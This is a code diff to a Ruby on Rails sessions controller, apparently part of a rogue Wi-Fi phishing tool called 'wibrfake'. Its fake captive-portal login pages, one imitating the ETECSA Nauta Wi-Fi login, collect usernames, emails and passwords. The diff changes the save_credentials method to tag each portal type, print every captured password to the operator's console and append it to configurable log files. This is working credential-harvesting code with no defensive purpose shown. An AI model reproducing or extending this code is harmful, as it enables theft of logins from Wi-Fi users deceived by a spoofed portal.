@@ -19,26 +19,42 @@ class SessionsController < ApplicationController
     end
   
     def basic_login
-        save_credentials(request.remote_ip, params[:username], params[:email], params[:password])
+        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], "basic")
         render "basic"
     end
   
     def nauta_login
-        save_credentials(request.remote_ip, params[:username], params[:email], params[:password])
+        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], "wifietecsa")
         render "nauta"
     end
   
     private
   
-    def save_credentials(ip, username, email, password)
-        puts """\n\r#{ip}{
-        \n\r\tUser: #{username}
-        \r\tEmail: #{email}
-        \r\tPassword: #{password}
-        \r}"""
+    def save_credentials(ip, username, email, password, login)
+        route_credential = ENV['CREDENTIAL_ROUTE']
+        iface = ENV['IFACE']
+        id = ENV['ID']
+        puts "\n\r{"
+        puts "\n\r\tip: #{ip}"
+        puts "\r\tUser: #{username}" if email.nil?
+        puts "\r\tEmail: #{email}" if username.nil?
+        puts "\r\tPassword: #{password}"
+        puts "\r}"
         puts "\n"
-        print "\r\033[38;5;236m\e[0m\033[48;5;236m \033[38;5;196mwibrfake  wlo1 \e[0m\033[38;5;236m\e[0m "
-        File.open(File.join(File.dirname(__FILE__), '../../lib/wibrfake/Logs/credentials.log'), 'a') do |file|
+        print "\r\033[38;5;236m\e[0m\033[48;5;236m \033[38;5;196mwibrfake  #{iface} \e[0m\033[38;5;236m\e[0m "
+
+        unless(route_credential.nil?)
+            File.open(route_credential, 'a'){|file|
+                file.puts "{"
+                file.puts "\tlogin: #{login}"
+                file.puts "\tip: #{ip}"
+                file.puts "\tuser: #{username}" if email.nil?
+                file.puts "\temail: #{email}" if username.nil?
+                file.puts "\tpassword: #{password}"
+                file.puts "}"
+            }
+        end
+        File.open(File.join(File.dirname(__FILE__), '..', '..', 'lib', 'wibrfake', 'Tmp', id, 'credentials', 'credentials.log'), 'a') do |file|
             file.puts "#{Time.now} IP: #{ip}, Username: #{username}, Email: #{email}, Password: #{password}"
         end
     end
